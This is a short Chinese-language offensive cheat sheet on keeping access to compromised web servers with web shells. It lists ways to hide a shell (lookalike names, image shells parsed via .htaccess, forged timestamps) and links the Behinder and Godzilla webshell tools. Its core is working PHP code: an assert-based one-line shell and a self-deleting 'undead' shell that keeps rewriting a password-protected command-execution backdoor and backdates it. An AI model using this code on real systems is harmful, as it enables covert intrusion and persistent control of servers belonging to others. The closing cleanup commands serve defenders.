---
title: 【权限维持】WebShell
---
# WebShell
## 隐藏WebShell

> 1、仿照已存在的文件起名字，隐藏在深层目录， 创建…目录隐藏shell
> 2、利用静态文件，比如图片马然后利用 .htaccess 进行解析
> 3、修改WebShell时间戳为同目录下其它文件相同的时间
## 快速应用
直接上冰蝎加密shell，或哥斯拉内存马（基于tomcat）
冰蝎：https://github.com/rebeyond/Behinder
哥斯拉：https://github.com/BeichenDream/Godzilla

## PHP

**文件免杀**（Apache、Nginx特性）cmd

```php
<? assert(implode(reset(get_defined_vars())));	//返回由所有已定义变量所组成的数组    
Use age：cmd.php?a=system(whoami);
适用于PHP < 7.1 ，因为在PHP7.1之后assert被弃用了、7.2 create_function被弃用了
```
**内存马**

```php
//nodie_shell.php
<?php
	set_time_limit(0);			//设置脚本最大执行时间,0 即为无时间限制
	ignore_user_abort(true);	//设置与客户机断开不终止脚本的执行
	unlink(__FILE__);			//删除文件自身
	$file = '/var/www/html/.shell.php';	
	$code = '<?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8"){@system($_POST[a]);}?>';
	while (1) {
		file_put_contents($file, $code);	//写shell文件
		system('touch -m -d "2014-10-31 13:50:11" .shell.php');		//修改时间戳
		usleep(1000);			//以指定的微秒数延缓程序的执行
	}
?>
```

**杀死PHP不死马**

```bash
1、高权限，重启服务
service apache2 restart
service php restart

2、低权限，杀掉所有进程
kill -9 -1
killall apache2
```

## 其它参考
Tomcat无文件Shell： https://github.com/z1Ro0/tomcat_nofile_webshell 


[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s/s_DcLdhEtIZkC2_z0Zz4FQ)

[冰蝎改造之不改动客户端=>内存马](https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484318&idx=1&sn=ece9e52218be0ea84ef166c3bfd20f23&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188&scene=126&sessionid=1596615082&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f&ascene=1&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=AzFdHdxTih44P2kITVRk35s%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb)